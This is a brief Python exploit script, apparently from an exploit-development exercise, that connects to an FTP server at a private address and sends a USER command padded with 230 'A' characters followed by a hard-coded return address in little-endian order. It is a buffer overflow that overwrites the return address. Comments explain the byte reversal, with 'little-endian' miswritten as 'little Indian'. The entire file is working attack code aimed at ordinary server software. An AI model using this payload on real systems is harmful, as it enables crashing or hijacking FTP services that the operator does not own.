#The return address we can ignore the 0x , so 7c bd 41 fb (4 characters). 
#When we are talking with x86 architecture, we need to use little Indian formatting 
#it stores the low order byte at the lowest address and high order at highest. On placing these 4 characters we should place them in reverse order 

#"\xfb\x41\xbd\x7c"
import sys
import socket
s=socket.socket()
s.connect(("192.168.1.56",21))

payload = b"USER "+b"A"*230 + b"\xfb\x41\xbd\x7c"
print(payload)
s.recv(1024)
s.send(payload+b"\r\n")
s.close()
